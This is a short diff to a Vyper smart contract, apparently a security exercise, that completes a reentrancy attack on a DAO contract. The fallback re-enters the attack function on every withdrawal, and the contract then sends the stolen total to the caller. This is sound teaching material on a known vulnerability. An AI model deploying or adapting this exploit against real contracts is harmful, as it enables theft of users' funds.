@@ -19,7 +19,7 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
 
     if DAO(self.dao_address).withdraw():
-        _attack()
+        pass
 
     return True
 
@@ -43,7 +43,7 @@ def attack(dao_address:address):
 
     # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
 
-    send(msg.sender, msg.value)
+    send(msg.sender, total_amount)
     
 
 
@@ -53,5 +53,5 @@ def __default__():
     # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
     
     # TODO: Add code here to complete the recursive call
-    send(msg.sender, msg.value)
+    self._attack()
 
